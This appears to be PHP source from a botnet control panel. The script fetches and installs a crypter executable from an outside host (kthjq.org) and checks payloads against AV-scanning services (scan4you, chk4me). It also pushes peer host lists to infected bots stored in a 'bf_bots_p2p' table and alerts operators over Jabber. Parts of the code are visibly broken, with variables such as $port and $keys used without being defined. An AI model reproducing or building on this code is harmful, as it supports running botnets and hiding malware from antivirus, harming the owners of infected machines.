#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '256M');

function real_path($p){
    $r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    if(empty($r)){
	mkdir(str_replace('//', '/', str_replace('\\', '/', $p)));
	$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    }
    return $r;
}

$dir = array();
$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['site'] = real_path($dir['script'] . '/../../');

$debug = true;

if($debug == true){
    file_put_contents('debug.txt', '');
}

if(!extension_loaded ('zip')) exit;

ini_set('error_log', $dir['site'] . 'cache/p2p_errors_php.txt');

function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8) file_put_contents($dir['site'] . 'cache/p2p_errors_php.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

$pid_file = 'cache/p2p.pid';

if(file_exists($dir['site'] . $pid_file)){
    if(IDOS === 'WIN'){
	$pid = file_get_contents($dir['site'] . $pid_file);
	if(stripos(exec('tasklist /FI "'.WIN_LOCALIZE_PID.' eq '.$pid.'"'), $pid) === false){
	    file_put_contents($dir['site'] . $pid_file, getmypid());
	    @chmod($dir['site'] . $pid_file, 0777);
	}else{
	    exit;
	}
    }else{
	$pid = file_get_contents($dir['site'] . $pid_file);
	if(stripos(exec('ps -p '.$pid), $pid) === false){
	    file_put_contents($dir['site'] . $pid_file, getmypid());
	    @chmod($dir['site'] . $pid_file, 0777);
	}else{
	    exit;
	}
    }
}else{
    file_put_contents($dir['site'] . $pid_file, getmypid());
    chmod($dir['site'] . $pid_file, 0777);
}

include_once($dir['site'] . 'includes/functions.av.php');

$cfg = json_decode(file_get_contents($dir['site'] . '/cache/config.json'), true);

if(empty($cfg['b_scan4you_id']) || empty($cfg['b_scan4you_token'])) exit;

if(!empty($cfg['b_chk4me_token'])){
    require_once($dir['site'] . 'classes/chk4me.lib.php');
    $checker = new AvcheckAPI(trim($cfg['b_chk4me_token']), 'chk4me.com');
}

//CRYPTOR_LINK START
$cryptor = array();
$cryptor['url'] = 'http://kthjq.org/crpt/Mystic.exe';
$cryptor['md5'] = 'http://kthjq.org/crpt/md5.php';
//CRYPTOR_LINK END

if(isset($cryptor) && is_array($cryptor)){
    $max_dl = 3;
    $cur_dl = 0;
    
    $error = array();
    $error['dl'] = false;
    $error['text'] = '';
    
    do{
	$next_dl = false;
    
	$md5 = @file_get_contents($cryptor['md5']);
	if(!empty($md5) && preg_match('~^\{(.*)\}$~', $md5)){
	    $md5 = json_decode($md5, true);
    
	    $file['new'] = $dir['site'] . 'cache/cryptor/CRYPTOR_NEW.EXE';
	    $file['local'] = $dir['site'] . 'cache/cryptor/CRYPTOR.EXE';
	    $file['bak'] = $dir['site'] . 'cache/cryptor/CRYPTOR.EXE.BAK';
    
	    $fp =fopen($file['new'],'w+b');
	    if($fp){
		$curl = curl_init($cryptor['url']);
		curl_setopt($curl, CURLOPT_FILE, $fp);
		curl_exec($curl);
		curl_close($curl);
		fclose($fp);
    
		if(md5_file($file['new']) == $md5[basename($cryptor['url'])]){
		    if(file_exists($file['bak'])) unlink($file['bak']);
    
		    rename($file['local'], $file['bak']);
		    @chmod($file['bak'], 0777);
    
		    rename($file['new'], $file['local']);
		    @chmod($file['local'], 0777);
    
		    $error['dl'] = false;
		    $error['text'] = '';
		}else{
		    $error['dl'] = true;
		    $error['text'] = 'MD5 FILE ERROR!';
		}
	    }else{
		$error['dl'] = true;
		$error['text'] = 'FILE CREATE ERROR!';
	    }
	}else{
	    $error['dl'] = true;
	    $error['text'] = 'MD5 GET ERROR!';
	}
    
	if(file_exists($file['new'])) unlink($file['new']);
    
	if($error['dl'] == true){
	    $next_dl = true;
    
	    if(!empty($cfg['jabber']['bt_tracking'])){
		$text = 'Error update cryptor!' . "\r\n";
		$text .= 'Cryptor link:  ' . $cryptor['url'] . "\r\n";
		$text .= 'Error text:  ' . $error['text'] . "\r\n";
    
		if(strpos($cfg['jabber']['bt_tracking'], ',') != false){
		    $jt = explode(',', $cfg['jabber']['bt_tracking']);
		    if($jt > 0){
			foreach($jt as $jab){
			    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
			}
		    }
		}else{
		    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $cfg['jabber']['bt_tracking'] . '_' . mt_rand(5, 15) . time(), $text);
		}
	    }
	}else{
	    $next_dl = false;
	}
    
	$cur_dl++;
    }while($next_dl == true && $cur_dl < $max_dl);
}

include_once($dir['site'] . 'includes/functions.get_config.php');
$cfg_db = get_config();

require_once($dir['site'] . 'classes/mysqli.class.php');
$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

function debug_save($str){
	file_put_contents('debug.txt', $str . "\r\n", FILE_APPEND);
	print_r($str . "\r\n");
}

function update_bot($row){
	global $mysqli, $dir;;
	$fp = @fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 5);
	if(!$fp){
		@fclose($fp);
		return false;
	}else{
		$buf = '';
		fwrite($fp, '!GU!');
		usleep(100);
		while (!feof($fp)) {
			$buf = fgets($fp, 1024);
		}
		
		$mysqli->query('update bf_bots_p2p set status = \'1\', send_date = \'0000-00-00 00:00:00\' WHERE (`id` = \''.$row->id.'\') LIMIT 1');
		usleep(100);
		
		if(file_exists($dir['site'] . 'cache/p2p.json')){
			$keys = json_decode(base64_decode($keys), 1);
			
			if(isset($keys['hosts']) && !empty($keys['hosts'])){
				if($buf == $row->prefix . $row->uid){
					$buf = '';
					$msg = '!SD!=' . $keys['hosts'];
					fwrite($fp, $msg);
					usleep(100);
					while (!feof($fp)) {
						$buf = fgets($fp, 1024);
					}
					
					if($buf == '!OK!'){
						$mysqli->query('update bf_bots_p2p set status = \'2\', send_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
					}else{
						$mysqli->query('update bf_bots_p2p set status = \'1\', send_date = \'0000-00-00 00:00:00\' WHERE (`id` = \''.$row->id.'\') LIMIT 1');
					}
					fclose($fp);
					return true;
				}else{
					fclose($fp);
					return false;
				}
			}
		}
		
		fclose($fp);
		return false;
	}
}

$mysqli->query('SELECT * FROM bf_bots_p2p', null, 'update_bot');

//sleep(10);

unlink($dir['site'] . $pid_file);

?>